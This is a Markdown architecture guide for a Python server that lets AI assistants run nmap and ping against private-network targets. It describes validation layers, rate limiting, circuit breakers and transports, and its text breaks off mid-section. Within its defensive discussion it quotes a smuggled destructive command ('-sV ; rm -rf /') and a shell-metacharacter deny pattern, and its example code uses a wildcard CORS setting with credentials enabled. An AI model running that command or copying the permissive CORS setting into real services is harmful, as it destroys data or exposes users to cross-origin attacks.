```Markdown
# MCP Server Architecture Design Guide

## Table of Contents
1. [Executive Overview](#executive-overview)
2. [Architectural Principles](#architectural-principles)
3. [System Architecture](#system-architecture)
4. [Core Components](#core-components)
5. [Data Flow](#data-flow)
6. [Security Architecture](#security-architecture)
7. [Reliability & Resilience](#reliability--resilience)
8. [Configuration System](#configuration-system)
9. [Transport Layer](#transport-layer)
10. [Extension Points](#extension-points)

---

## Executive Overview

### What is This System?

The MCP (Model Context Protocol) Server is a **production-ready, enterprise-grade tool execution framework** designed to safely expose system utilities (like `nmap`, `ping`, `traceroute`) to AI assistants like Claude Desktop.

### Key Design Goals

1. **Safety First**: Multi-layer security controls prevent malicious command injection
2. **Reliability**: Circuit breakers, retries, and graceful degradation
3. **Observability**: Comprehensive metrics, health checks, and structured logging
4. **Extensibility**: Simple tool creation via inheritance pattern
5. **Production Ready**: Resource limits, rate limiting, graceful shutdown

### Technology Stack

- **Language**: Python 3.8+
- **Async Framework**: asyncio with optional uvloop
- **Validation**: Pydantic (v1/v2 compatible)
- **HTTP Transport**: FastAPI + Uvicorn
- **Stdio Transport**: MCP Protocol SDK
- **Metrics**: Prometheus-compatible
- **Configuration**: YAML-based with environment overrides

---

## Architectural Principles

### 1. Defense in Depth (Security)

The system implements **5 layers of security**:
Layer 1: Transport Security (CORS, Rate Limiting)
↓
Layer 2: Input Validation (Pydantic models, RFC1918 checks)
↓
Layer 3: Command Sanitization (Whitelist flags, deny chars)
↓
Layer 4: Execution Isolation (Process groups, resource limits)
↓
Layer 5: Output Sanitization (Truncation, encoding)

text


**Example from base_tool.py (Lines 47-48)**:
```python
_DENY_CHARS = re.compile(r"[;&|`$><\n\r]")
_TOKEN_ALLOWED = re.compile(r"^[A-Za-z0-9.:/=+,\-@%_]+$")
These regexes block shell metacharacters that could enable command injection.

2. Separation of Concerns
The codebase is organized into distinct layers:

text

┌─────────────────────────────────────────┐
│         Transport Layer                 │  (server.py)
│  (stdio/HTTP, routing, rate limiting)   │
├─────────────────────────────────────────┤
│      Orchestration Layer                │  (server.py)
│  (tool registry, health, metrics)       │
├─────────────────────────────────────────┤
│         Tool Layer                      │  (base_tool.py)
│  (validation, execution, error handling)│
├─────────────────────────────────────────┤
│      Implementation Layer               │  (nmap_tool.py)
│  (tool-specific logic)                  │
└─────────────────────────────────────────┘
3. Fail-Safe Defaults
Every configurable parameter has a safe default:

From base_tool.py (Lines 50-56):

Python

_MAX_ARGS_LEN = int(os.getenv("MCP_MAX_ARGS_LEN", "2048"))
_MAX_STDOUT_BYTES = int(os.getenv("MCP_MAX_STDOUT_BYTES", "1048576"))  # 1MB
_MAX_STDERR_BYTES = int(os.getenv("MCP_MAX_STDERR_BYTES", "262144"))    # 256KB
_DEFAULT_TIMEOUT_SEC = float(os.getenv("MCP_DEFAULT_TIMEOUT_SEC", "300"))
_DEFAULT_CONCURRENCY = int(os.getenv("MCP_DEFAULT_CONCURRENCY", "2"))
_MAX_MEMORY_MB = int(os.getenv("MCP_MAX_MEMORY_MB", "512"))
_MAX_FILE_DESCRIPTORS = int(os.getenv("MCP_MAX_FILE_DESCRIPTORS", "256"))
These limits prevent resource exhaustion attacks.

4. Async-First Design
All I/O operations are async to maximize concurrency:

From base_tool.py (Lines 212-225):

Python

async def run(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
    """Run tool with circuit breaker, metrics, and resource limits."""
    start_time = time.time()
    
    # Record active execution
    if self.metrics:
        self.metrics.increment_active()
    
    try:
        # Execute with semaphore for concurrency control
        async with self._ensure_semaphore():
            # ... execution logic
The semaphore pattern (Lines 178-209) ensures controlled concurrency per event loop.

System Architecture
Component Diagram
text

┌─────────────────────────────────────────────────────────────┐
│                    MCP Server Process                       │
│                                                             │
│  ┌──────────────┐         ┌──────────────┐                │
│  │   Transport  │         │    Health    │                │
│  │  (stdio/HTTP)│◄────────┤   Manager    │                │
│  └──────┬───────┘         └──────────────┘                │
│         │                                                  │
│         ▼                                                  │
│  ┌──────────────────────────────────────┐                │
│  │         Tool Registry                │                │
│  │  ┌────────┐  ┌────────┐  ┌────────┐ │                │
│  │  │ Nmap   │  │ Ping   │  │Custom  │ │                │
│  │  │ Tool   │  │ Tool   │  │ Tool   │ │                │
│  │  └───┬────┘  └───┬────┘  └───┬────┘ │                │
│  └──────┼───────────┼───────────┼───────┘                │
│         │           │           │                         │
│         ▼           ▼           ▼                         │
│  ┌────────────────────────────────────────┐              │
│  │         MCPBaseTool                    │              │
│  │  ┌──────────┐  ┌──────────┐           │              │
│  │  │ Circuit  │  │ Metrics  │           │              │
│  │  │ Breaker  │  │ Manager  │           │              │
│  │  └──────────┘  └──────────┘           │              │
│  └────────────────────────────────────────┘              │
│         │                                                 │
│         ▼                                                 │
│  ┌────────────────────────────────────────┐              │
│  │    Subprocess Execution                │              │
│  │  (with resource limits)                │              │
│  └────────────────────────────────────────┘              │
└─────────────────────────────────────────────────────────────┘
Core Components
1. MCPBaseTool (base_tool.py)
Purpose: Abstract base class providing execution framework for all tools.

Key Responsibilities:

Input validation (Lines 122-166)
Argument sanitization (Lines 496-544)
Subprocess execution with limits (Lines 546-629)
Error context creation (Lines 71-91)
Metrics recording (Lines 258-280)
Circuit breaker integration (Lines 168-180)
State Machine:

text

[Input] → [Validate Target] → [Parse Args] → [Sanitize] → 
[Check Circuit Breaker] → [Acquire Semaphore] → [Execute] → 
[Record Metrics] → [Return Output]
Critical Code Pattern - Semaphore Management (Lines 182-209):

Python

def _ensure_semaphore(self) -> asyncio.Semaphore:
    """Thread-safe semaphore initialization per event loop with automatic cleanup."""
    global _semaphore_registry, _loop_refs
    
    try:
        loop = asyncio.get_running_loop()
        loop_id = id(loop)
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop_id = id(loop)
    
    key = f"{self.__class__.__name__}_{loop_id}"
    
    with _semaphore_lock:
        # Store weak reference to loop for cleanup detection
        _loop_refs[loop_id] = loop
        
        # Clean up semaphores for dead loops
        dead_keys = [
            k for k in _semaphore_registry.keys() 
            if int(k.split('_')[-1]) not in _loop_refs
        ]
        for dead_key in dead_keys:
            del _semaphore_registry[dead_key]
Why This Matters: Each event loop gets its own semaphore, preventing cross-loop pollution. Weak references enable automatic cleanup when loops die.

2. EnhancedMCPServer (server.py)
Purpose: Orchestrate tool discovery, health monitoring, and request routing.

Key Responsibilities:

Tool discovery via package scanning (Lines 137-186)
Health check aggregation (Lines 483-518)
Metrics collection (Lines 520-541)
Rate limiting (Lines 351-413)
Transport-agnostic execution (Lines 700-753)
Tool Discovery Algorithm (Lines 137-186):

Python

def _load_tools_from_package(
    package_path: str,
    include: Optional[Sequence[str]] = None,
    exclude: Optional[Sequence[str]] = None,
) -> List[MCPBaseTool]:
    """Discover and instantiate concrete MCPBaseTool subclasses."""
    
    # 1. Import package
    pkg = importlib.import_module(package_path)
    
    # 2. Walk package tree
    for modinfo in pkgutil.walk_packages(pkg.__path__):
        module = importlib.import_module(modinfo.name)
        
        # 3. Inspect classes
        for name, obj in inspect.getmembers(module, inspect.isclass):
            # 4. Filter exclusions
            if _should_exclude_class(name):
                continue
            
            # 5. Check inheritance
            if not issubclass(obj, MCPBaseTool) or obj is MCPBaseTool:
                continue
            
            # 6. Apply include/exclude filters
            if include and name not in include:
                continue
            if exclude and name in exclude:
                continue
            
            # 7. Instantiate
            inst = obj()
            tools.append(inst)
Exclusion Pattern Matching (Lines 108-135):

Python

EXCLUDED_PREFIXES = {'Test', 'Mock', 'Abstract', '_', 'Example'}
EXCLUDED_SUFFIXES = {'Base', 'Mixin', 'Interface'}
EXCLUDED_EXACT = {'MCPBaseTool'}

def _should_exclude_class(name: str) -> bool:
    """Check if class should be excluded from tool discovery."""
    if name in EXCLUDED_EXACT:
        return True
    if any(name.startswith(prefix) for prefix in EXCLUDED_PREFIXES):
        return True
    if any(name.endswith(suffix) for suffix in EXCLUDED_SUFFIXES):
        return True
    return False
3. ToolRegistry (server.py, Lines 416-481)
Purpose: Manage tool lifecycle and enablement state.

Data Structure:

Python

class ToolRegistry:
    def __init__(self, config, tools: List[MCPBaseTool]):
        self.config = config
        self.tools: Dict[str, MCPBaseTool] = {}           # name → tool instance
        self.enabled_tools: Set[str] = set()              # enabled tool names
Enable/Disable Flow:

text

Registration → Environment Filter Check → Circuit Breaker Init → 
Metrics Init → Add to Registry → Mark as Enabled/Disabled
4. RateLimiter (server.py, Lines 351-413)
Algorithm: Token Bucket with per-client tracking

From Lines 365-402:

Python

async def check_rate_limit(self, key: str) -> bool:
    """Token bucket algorithm."""
    current = datetime.now()
    time_passed = (current - self.last_check.get(key, current)).total_seconds()
    self.last_check[key] = current
    
    # Add tokens based on time passed
    self.allowance[key] += time_passed * (self.rate / self.per)
    if self.allowance[key] > self.rate:
        self.allowance[key] = self.rate  # Cap at max
    
    # Check if request allowed
    if self.allowance[key] < 1.0:
        return False
    
    # Consume token
    self.allowance[key] -= 1.0
    return True
Memory Management (Lines 385-402):

Periodic cleanup every 100 requests
Removes clients inactive for 2x the time window
Enforces max_clients limit by removing oldest
Data Flow
Request Flow (HTTP Transport)
text

1. HTTP Request
   ↓
2. Rate Limiter Check (per client IP + tool)
   ↓
3. Pydantic Validation (ToolExecutionRequest)
   ↓
4. Tool Registry Lookup
   ↓
5. Tool Enabled Check
   ↓
6. Create ToolInput
   ↓
7. MCPBaseTool.run()
   ├─ Circuit Breaker Check
   ├─ Semaphore Acquire
   ├─ Validate Target (RFC1918)
   ├─ Parse & Sanitize Args
   ├─ Spawn Subprocess (with resource limits)
   ├─ Wait for Completion (with timeout)
   └─ Record Metrics
   ↓
8. Return ToolOutput
   ↓
9. Background Metrics Recording
Stdio Transport Flow
text

1. MCP Protocol Message (JSON-RPC)
   ↓
2. MCP Server Routing
   ↓
3. Tool Handler Lookup
   ↓
4. Create ToolInput from Parameters
   ↓
5-8. [Same as HTTP steps 5-8]
   ↓
9. Convert to TextContent
   ↓
10. MCP Protocol Response
Error Flow
text

Exception Raised
   ↓
Caught in MCPBaseTool.run() (Lines 282-291)
   ↓
Create ErrorContext with:
   - error_type (enum)
   - message
   - recovery_suggestion
   - timestamp
   - metadata
   ↓
Log Structured Error (Line 354-360)
   ↓
Create ToolOutput with error=True
   ↓
Record Failure Metrics
   ↓
Update Circuit Breaker
   ↓
Return Error Response
Security Architecture
Multi-Layer Defense
Layer 1: Transport Security
HTTP Mode (server.py, Lines 600-612):

Python

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Configure restrictively in production
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"]
)
Rate Limiting (Lines 646-657):

Python

rate_limit_key = f"{client_ip}:{tool_name}"
if not await self.rate_limiter.check_rate_limit(rate_limit_key):
    raise HTTPException(
        status_code=429,
        detail={"error": "Rate limit exceeded"}
    )
Layer 2: Input Validation
Target Validation (base_tool.py, Lines 64-88):

Python

def _is_private_or_lab(value: str) -> bool:
    """Validate RFC1918 private IPs or .lab.internal hostnames."""
    if value.endswith(".lab.internal"):
        hostname_part = value[:-len(".lab.internal")]
        if not _HOSTNAME_PATTERN.match(hostname_part):
            return False
        return True
    
    try:
        if "/" in value:
            net = ipaddress.ip_network(value, strict=False)
            return net.version == 4 and net.is_private
        else:
            ip = ipaddress.ip_address(value)
            return ip.version == 4 and ip.is_private
    except ValueError:
        return False
Why This Matters: Prevents scanning public internet, limiting blast radius.

Pydantic Validators (base_tool.py, Lines 135-166):

Python

class ToolInput(BaseModel):
    target: str
    extra_args: str = ""
    
    @field_validator("target", mode='after')
    def _validate_target(cls, v: str) -> str:
        if not _is_private_or_lab(v):
            raise ValueError("Target must be RFC1918 or .lab.internal")
        return v
    
    @field_validator("extra_args", mode='after')
    def _validate_extra_args(cls, v: str) -> str:
        if len(v) > _MAX_ARGS_LEN:
            raise ValueError(f"extra_args too long")
        if _DENY_CHARS.search(v):
            raise ValueError("Forbidden metacharacters")
        return v
Layer 3: Command Sanitization
Whitelist-Based Validation (nmap_tool.py, Lines 393-493):

Python

def _parse_and_validate_args(self, extra_args: str) -> str:
    """Parse and validate with STRICT security."""
    tokens = shlex.split(extra_args)
    validated = []
    
    for token in tokens:
        # CRITICAL: Block ALL non-flag tokens
        if not token.startswith("-"):
            raise ValueError(
                f"Non-flag token blocked (injection risk): '{token}'"
            )
        
        # Check against whitelist
        flag_base = token.split("=", 1)[0]
        if flag_base not in self.allowed_flags:
            raise ValueError(f"Flag not allowed: '{token}'")
        
        validated.append(token)
    
    return " ".join(validated)
Why Whitelist > Blacklist: Impossible to enumerate all attack vectors. Whitelist ensures only known-safe operations.

Example Attack Blocked:

Python

# Input: "-sV ; rm -rf /"
# After shlex.split: ['-sV', ';', 'rm', '-rf', '/']
# Token ';' fails: not token.startswith("-")
# Result: ValueError raised, attack blocked
Layer 4: Execution Isolation
Resource Limits (base_tool.py, Lines 546-570):

Python

def _set_resource_limits(self):
    """Set resource limits for subprocess (Unix/Linux only)."""
    def set_limits():
        try:
            # Limit CPU time
            timeout_int = int(self.default_timeout_sec)
            resource.setrlimit(resource.RLIMIT_CPU, (timeout_int, timeout_int + 5))
            
            # Limit memory
            mem_bytes = _MAX_MEMORY_MB * 1024 * 1024
            resource.setrlimit(resource.RLIMIT_AS, (mem_bytes, mem_bytes))
            
            # Limit file descriptors
            resource.setrlimit(resource.RLIMIT_NOFILE, 
                             (_MAX_FILE_DESCRIPTORS, _MAX_FILE_DESCRIPTORS))
            
            # Prevent core dumps
            resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
        except Exception as e:
            log.warning("resource_limits.failed error=%s", str(e))
    
    return set_limits
Process Group Isolation (Lines 572-606):

Python

proc = await asyncio.create_subprocess_exec(
    *cmd,
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.PIPE,
    env=env,                    # Clean environment
    preexec_fn=preexec_fn,     # Resource limits
    start_new_session=True,    # Isolate process group
)
Why start_new_session=True: Creates new process group, preventing subprocess from interfering with parent process signals.

Layer 5: Output Sanitization
Truncation Limits (Lines 613-620):

Python

truncated_stdout = False
truncated_stderr = False

if len(out) > _MAX_STDOUT_BYTES:
    out = out[:_MAX_STDOUT_BYTES]
    truncated_stdout = True

if len(err) > _MAX_STDERR_BYTES:
    err = err[:_MAX_STDERR_BYTES]
    truncated_stderr = True
Encoding Safety (Line 623):

Python

stdout=out.decode(errors="replace"),  # Replace invalid UTF-8
stderr=err.decode(errors="replace"),
Reliability & Resilience
Circuit Breaker Pattern
Purpose: Prevent cascading failures when tool repeatedly fails.

State Machine:

text

        failure_count < threshold
CLOSED ──────────────────────────────► CLOSED
  │                                       │
  │ failure_count >= threshold            │
  ├──────────────────────────────────────►│
  │                                       │
  ▼                                       ▼
OPEN ◄─────────────────────────────── HALF_OPEN
      recovery_timeout expires        success
      
      failure in HALF_OPEN → OPEN
Integration (base_tool.py, Lines 212-257):

Python

async def run(self, inp: ToolInput) -> ToolOutput:
    # Check circuit breaker state
    if self._circuit_breaker:
        state = getattr(self._circuit_breaker, 'state', None)
        if state == CircuitBreakerState.OPEN:
            return self._create_circuit_breaker_error(inp, correlation_id)
    
    # Execute with circuit breaker
    async with self._ensure_semaphore():
        if self._circuit_breaker:
            result = await self._circuit_breaker.call(
                self._execute_tool, inp, timeout_sec
            )
        else:
            result = await self._execute_tool(inp, timeout_sec)
Configuration (nmap_tool.py, Lines 121-123):

Python

circuit_breaker_failure_threshold: int = 5       # Failures before OPEN
circuit_breaker_recovery_timeout: float = 120.0  # Seconds in OPEN
circuit_breaker_expected_exception: tuple = (Exception,)
Concurrency Control
Semaphore Pattern (base_tool.py, Lines 182-209):

Per-tool, per-event-loop semaphores limit concurrent executions:

Python

# NmapTool: concurrency = 1 (only 1 nmap at a time)
# PingTool: concurrency = 5 (up to 5 concurrent pings)

async with self._ensure_semaphore():  # Acquires token
    result = await self._execute_tool(inp, timeout_sec)
    # Token automatically released on exit
Why Per-Event-Loop: Multiple event loops (e.g., testing) don't share semaphores, preventing deadlocks.

Timeout Management
Hierarchical Timeouts:

Tool Default (class attribute)

Python

default_timeout_sec: float = 600.0
Config Override (YAML)

YAML

tool:
  default_timeout: 300
Request Override (runtime)

Python

ToolInput(target="...", timeout_sec=120)
Priority: Request > Config > Default

Implementation (base_tool.py, Lines 315-328):

Python

async def _execute_tool(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
    timeout = float(timeout_sec or inp.timeout_sec or self.default_timeout_sec)
    return await self._spawn(cmd, timeout)
Subprocess Timeout (Lines 590-607):

Python

try:
    out, err = await asyncio.wait_for(proc.communicate(), timeout=timeout_sec)
except asyncio.TimeoutError:
    # Kill process group
    if sys.platform != 'win32':
        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
    else:
        proc.kill()
    await proc.wait()
    
    return ToolOutput(
        stdout="",
        stderr=f"Process timed out after {timeout_sec}s",
        returncode=124,
        timed_out=True,
        error_type=ToolErrorType.TIMEOUT.value
    )
Graceful Shutdown
Server Lifecycle (server.py, Lines 842-881):

Python

async def cleanup(self):
    """Comprehensive cleanup of all resources."""
    
    # 1. Stop health monitoring
    await self.health_manager.stop_monitoring()
    
    # 2. Cleanup metrics
    await self.metrics_manager.cleanup()
    
    # 3. Cancel background tasks
    tasks_to_cancel = list(self._background_tasks)
    for task in tasks_to_cancel:
        if not task.done():
            task.cancel()
    
    # 4. Wait for cancellation
    await asyncio.gather(*tasks_to_cancel, return_exceptions=True)
    
    # 5. Cleanup tools (circuit breakers, etc.)
    for tool_name, tool in self.tool_registry.tools.items():
        if hasattr(tool._circuit_breaker, 'cleanup'):
            await tool._circuit_breaker.cleanup()
Signal Handling (Lines 543-567):

Python

def _setup_enhanced_signal_handlers(self):
    """Set up thread-safe signal handlers."""
    def signal_handler(signum, frame):
        log.info("enhanced_server.shutdown_signal signal=%s", signum)
        loop = asyncio.get_event_loop()
        loop.call_soon_threadsafe(self.shutdown_event.set)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
Graceful Period (Lines 920-938):

Python

serve_task = asyncio.create_task(server.serve())
await stop.wait()  # Wait for shutdown signal

serve_task.cancel()
try:
    await asyncio.wait_for(serve_task, timeout=shutdown_grace)
except asyncio.TimeoutError:
    log.warning("server.shutdown_forced")
Configuration System
Configuration Hierarchy
text

1. Code Defaults (hardcoded safe values)
   ↓
2. YAML Config File (MCP_CONFIG_FILE env var)
   ↓
3. Environment Variables (MCP_* prefix)
   ↓
4. Runtime Parameters (method arguments)
Lower layers override higher layers.

Configuration Schema
From nmap_tool.py (Lines 169-218):

Python

def _apply_config(self):
    """Apply configuration with clamping for safety."""
    
    # Circuit Breaker Config
    if hasattr(self.config, 'circuit_breaker'):
        cb = self.config.circuit_breaker
        if hasattr(cb, 'failure_threshold'):
            # Clamp to safe range [1, 10]
            original = self.circuit_breaker_failure_threshold
            self.circuit_breaker_failure_threshold = max(1, min(10, int(cb.failure_threshold)))
            if self.circuit_breaker_failure_threshold != original:
                log.info("nmap.config_clamped param=failure_threshold ...")
    
    # Tool Config
    if hasattr(self.config, 'tool'):
        tool = self.config.tool
        if hasattr(tool, 'default_timeout'):
            # Clamp to [60, 3600] seconds
            self.default_timeout_sec = max(60.0, min(3600.0, float(tool.default_timeout)))
    
    # Security Config (CRITICAL)
    if hasattr(self.config, 'security'):
        sec = self.config.security
        if hasattr(sec, 'allow_intrusive'):
            old_intrusive = self.allow_intrusive
            self.allow_intrusive = bool(sec.allow_intrusive)
            
            if self.allow_intrusive != old_intrusive:
                # Clear script cache when policy changes
                self._script_cache.clear()
Why Clamping: Even if config file has malicious/invalid values, they're constrained to safe ranges.

Environment Variables
Complete List:

Bash

# Transport
MCP_SERVER_TRANSPORT=stdio|http
MCP_SERVER_PORT=8080
MCP_SERVER_HOST=0.0.0.0

# Tool Discovery
TOOLS_PACKAGE=mcp_server.tools
TOOL_INCLUDE=NmapTool,PingTool
TOOL_EXCLUDE=TestTool

# Resource Limits
MCP_MAX_ARGS_LEN=2048
MCP_MAX_STDOUT_BYTES=1048576
MCP_MAX_STDERR_BYTES=262144
MCP_DEFAULT_TIMEOUT_SEC=300
MCP_DEFAULT_CONCURRENCY=2
MCP_MAX_MEMORY_MB=512
MCP_MAX_FILE_DESCRIPTORS=256

# Security
MCP_SECURITY_ALLOW_INTRUSIVE=false

# Shutdown
MCP_SERVER_SHUTDOWN_GRACE_PERIOD=30

# Logging
LOG_LEVEL=INFO
LOG_FORMAT="%(asctime)s %(levelname)s %(name)s %(message)s"

# Config File
MCP_CONFIG_FILE=config.yaml
Transport Layer
Stdio Transport (Claude Desktop Integration)
Purpose: Communicate with Claude Desktop via JSON-RPC over stdin/stdout.

Flow (server.py, Lines 569-577):

Python

async def run_stdio_original(self):
    """Run server with stdio transport."""
    if not MCP_AVAILABLE:
        raise RuntimeError("MCP stdio support missing")
    
    async with stdio_server() as (read_stream, write_stream):
        await self.server.run(
            read_stream,
            write_stream,
            self.shutdown_event
        )
Tool Registration (Lines 417-441):

Python

def _register_tools_mcp(self):
    """Register tools with MCP server."""
    for tool in self.tools:
        self.server.register_tool(
            name=tool.__class__.__name__,
            description=tool.__doc__ or f"Execute {tool.command_name}",
            input_schema={
                "type": "object",
                "properties": {
                    "target": {"type": "string"},
                    "extra_args": {"type": "string"},
                    "timeout_sec": {"type": "number"}
                },
                "required": ["target"]
            },
            handler=self._create_mcp_tool_handler(tool)
        )
Handler Pattern (Lines 443-467):

Python

def _create_mcp_tool_handler(self, tool: MCPBaseTool):
    """Create MCP tool handler."""
    async def handler(target: str, extra_args: str = "", timeout_sec: Optional[float] = None):
        try:
            input_data = ToolInput(target=target, extra_args=extra_args, timeout_sec=timeout_sec)
            result = await tool.run(input_data)
            
            # Convert to MCP TextContent
            return [
                TextContent(
                    type="text",
                    text=json.dumps(result.dict(), indent=2)
                )
            ]
        except Exception as e:
            return [
                TextContent(
                    type="text",
                    text=json.dumps({"error": str(e)}, indent=2)
                )
            ]
    return handler
HTTP Transport (REST API)
Purpose: Expose tools via REST API for web/programmatic access.

Server Creation (Lines 579-597):

Python

async def run_http_enhanced(self):
    """Run server with HTTP transport."""
    app = FastAPI(
        title="Enhanced MCP Server",
        version="2.0.0",
        description="Production-ready MCP server"
    )
    
    app.add_middleware(CORSMiddleware, ...)
    
    # Register endpoints...
    
    config = uvicorn.Config(app, host=host, port=port)
    server = uvicorn.Server(config)
    await server.serve()
Key Endpoints:

Tool Execution (Lines 638-685):

Python

@app.post("/tools/{tool_name}/execute")
async def execute_tool(
    tool_name: str,
    request: ToolExecutionRequest,
    http_request: Request,
    background_tasks: BackgroundTasks
):
    # Rate limiting
    rate_limit_key = f"{client_ip}:{tool_name}"
    if not await self.rate_limiter.check_rate_limit(rate_limit_key):
        raise HTTPException(status_code=429, detail="Rate limit exceeded")
    
    # Get tool
    tool = self.tool_registry.get_tool(tool_name)
    if not tool or tool_name not in self.tool_registry.enabled_tools:
        raise HTTPException(status_code=404, detail="Tool not found/disabled")
    
    # Execute
    result = await tool.run(ToolInput(...))
    
    # Record metrics in background
    background_tasks.add_task(self._record_tool_metrics, tool_name, result)
    
    return result.dict()
Health Check (Lines 621-636):

Python

@app.get("/health")
async def health_check():
    status = await self.health_manager.get_overall_health()
    checks = await self.health_manager.get_all_check_results()
    
    response_status_code = 200
    if status == HealthStatus.UNHEALTHY:
        response_status_code = 503
    elif status == HealthStatus.DEGRADED:
        response_status_code = 207  # Multi-Status
    
    return JSONResponse(
        status_code=response_status_code,
        content={
            "status": status.value,
            "checks": checks,
            "summary": self.health_manager.get_health_summary()
        }
    )
Metrics (Lines 726-735):

Python

@app.get("/metrics")
async def metrics():
    if PROMETHEUS_AVAILABLE:
        metrics_text = self.metrics_manager.get_prometheus_metrics()
        return Response(content=metrics_text, media_type=CONTENT_TYPE_LATEST)
    
    # Fallback to JSON
    return JSONResponse(content=self.metrics_manager.get_all_stats())
Server-Sent Events (Lines 687-713):

Python

@app.get("/events")
async def events(request: Request):
    """SSE endpoint for real-time updates."""
    async def event_generator():
        while not await request.is_disconnected():
            health_status = await self.health_manager.get_overall_health()
            yield json.dumps({
                "type": "health",
                "data": {"status": health_status.value}
            })
            
            metrics_data = self.metrics_manager.get_system_stats()
            yield json.dumps({
                "type": "metrics",
                "data": metrics_data
            })
            
            await asyncio.sleep(5)
    
    return EventSourceResponse(event_generator())
Transport Fallback Logic (Lines 755-787):

Python

async def run(self):
    """Run with configured transport and safe fallbacks."""
    if self.transport == "http":
        if not FASTAPI_AVAILABLE:
            log.warning("HTTP deps missing, falling back to stdio")
            if MCP_AVAILABLE:
                self.transport = "stdio"
                await self.run_stdio_original()
                return
            raise RuntimeError("No transport available")
        await self.run_http_enhanced()
        return
    
    if self.transport == "stdio":
        if not MCP_AVAILABLE:
            log.warning("Stdio unavailable, falling back to HTTP")
            if FASTAPI_AVAILABLE:
                self.transport = "http"
                await self.run_http_enhanced()
                return
            raise RuntimeError("No transport available")
        await self.run_stdio_original()
        return
Extension Points
1. Adding New Tools
Minimal Implementation:

Python

from mcp_server.base_tool import MCPBaseTool

class MyTool(MCPBaseTool):
    command_name = "mytool"                    # Required
    allowed_flags = ["-flag1", "-flag2"]       # Optional
    default_timeout_sec = 300.0                # Optional
    concurrency = 2                            # Optional
    
    # That's it! Automatic discovery, validation, metrics, circuit breaker
Custom Validation:

Python

class MyTool(MCPBaseTool):
    command_name = "mytool"
    
    async def _execute_tool(self, inp: ToolInput, timeout_sec: Optional[float] = None) -> ToolOutput:
        # Custom validation before execution
        if some_custom_check(inp.target):
            error_context = ErrorContext(
                error_type=ToolErrorType.VALIDATION_ERROR,
                message="Custom validation failed",
                recovery_suggestion="Fix the input",
                timestamp=datetime.now(),
                tool_name=self.tool_name,
                target=inp.target
            )
            return self._create_error_output(error_context, inp.correlation_id or "")
        
        # Call parent implementation
        return await super()._execute_tool(inp, timeout_sec)
2. Custom Health Checks
From server.py (Lines 527-541):

Python

def _create_tool_health_check(self, tool: MCPBaseTool):
    """Create health check for a tool."""
    async def check_tool_health() -> HealthStatus:
        # Check if command available
        if not tool._resolve_command():
            return HealthStatus.UNHEALTHY
        
        # Check circuit breaker
        if tool._circuit_breaker and tool._circuit_breaker.state == CircuitBreakerState.OPEN:
            return HealthStatus.DEGRADED
        
        return HealthStatus.HEALTHY
    
    return check_tool_health

# Register it
self.health_manager.register_check(
    name=f"tool_{tool_name}",
    check_func=self._create_tool_health_check(tool),
    priority=HealthCheckPriority.INFORMATIONAL
)
3. Custom Metrics
Integration Points:

Tool-level (base_tool.py, Lines 258-280)
Server-level (server.py, Lines 737-745)
Example:

Python

# In tool implementation
async def run(self, inp: ToolInput) -> ToolOutput:
    result = await super().run(inp)
    
    # Custom metric
    if self.metrics:
        self.metrics.record_custom(
            "mytool_specific_metric",
            value=some_value,
            labels={"target_type": inp.target}
        )
    
    return result
4. Custom Transport
Pattern (server.py, Lines 755-787):

Python

class EnhancedMCPServer:
    async def run_custom_transport(self):
        """Implement custom transport."""
        # Your custom transport logic
        pass
    
    async def run(self):
        if self.transport == "custom":
            await self.run_custom_transport()
        # ... existing transports
Performance Characteristics
Benchmark Expectations
Concurrent Request Handling:

HTTP: Limited by uvicorn workers × tool concurrency
Stdio: Single-threaded JSON-RPC (sequential)
Example: NmapTool with concurrency=1

1st request: Executes immediately
2nd request: Waits for semaphore
3rd request: Queued behind 2nd
Memory Usage:

Base: ~50MB (server + dependencies)
Per Tool Instance: ~5MB (circuit breaker, metrics)
Per Execution: ~10MB (subprocess overhead) + tool-specific
Resource Limits (base_tool.py, Lines 546-570):

CPU: timeout × 1.0 (soft limit)
Memory: 512MB (hard limit)
File Descriptors: 256 (hard limit)
Optimization Strategies
Compiled Regex (nmap_tool.py, Lines 93-98):

Python

_PORT_SPEC_PATTERN = re.compile(r'^[\d,\-]+$')
_NUMERIC_PATTERN = re.compile(r'^\d+$')
# Pre-compiled, reused across requests
Script Caching (nmap_tool.py, Lines 497-553):

Python

def _validate_and_filter_scripts(self, script_spec: str) -> str:
    # Check cache
    if script_spec in self._script_cache:
        return self._script_cache[script_spec]
    
    # ... validation logic ...
    
    # Cache result
    self._script_cache[script_spec] = result
    return result
Smart Defaults (nmap_tool.py, Lines 686-729):

Python

def _optimize_nmap_args(self, extra_args: str) -> str:
    """Add performance defaults if not specified."""
    if not has_timing:
        optimized.append("-T4")  # Aggressive timing
    if not has_parallelism:
        optimized.extend(["--max-parallelism", "10"])
    if not has_port_spec:
        optimized.extend(["--top-ports", "1000"])
Background Tasks (server.py, Lines 682-685):

Python

# Record metrics in background (non-blocking)
background_tasks.add_task(self._record_tool_metrics, tool_name, result)
Troubleshooting Guide
Common Issues
1. Tool Not Discovered
Symptom: Tool class exists but not loaded.

Debug Steps:

Check class name doesn't match exclusion patterns:

Python

# server.py, Lines 108-110
EXCLUDED_PREFIXES = {'Test', 'Mock', 'Abstract', '_', 'Example'}
EXCLUDED_SUFFIXES = {'Base', 'Mixin', 'Interface'}
Verify inheritance:

Python

class MyTool(MCPBaseTool):  # Must inherit
    pass
Check package path:

Bash

TOOLS_PACKAGE=mcp_server.tools python -m mcp_server.server
Enable debug logging:

Bash

LOG_LEVEL=DEBUG python -m mcp_server.server
# Look for: "tool_discovery.tool_loaded name=MyTool"
2. Circuit Breaker Open
Symptom: Tool returns circuit_breaker_open error.

Recovery:

Wait for recovery_timeout (default 120s)
Check tool health:
Bash

curl http://localhost:8080/health
Manually reset (if available):
Python

tool._circuit_breaker.reset()
Prevention:

Increase failure_threshold in config
Fix underlying tool issues
3. Rate Limit Exceeded
Symptom: HTTP 429 response.

Solution:

Wait 60 seconds (default window)
Adjust rate limiter:
Python

# server.py, Line 496
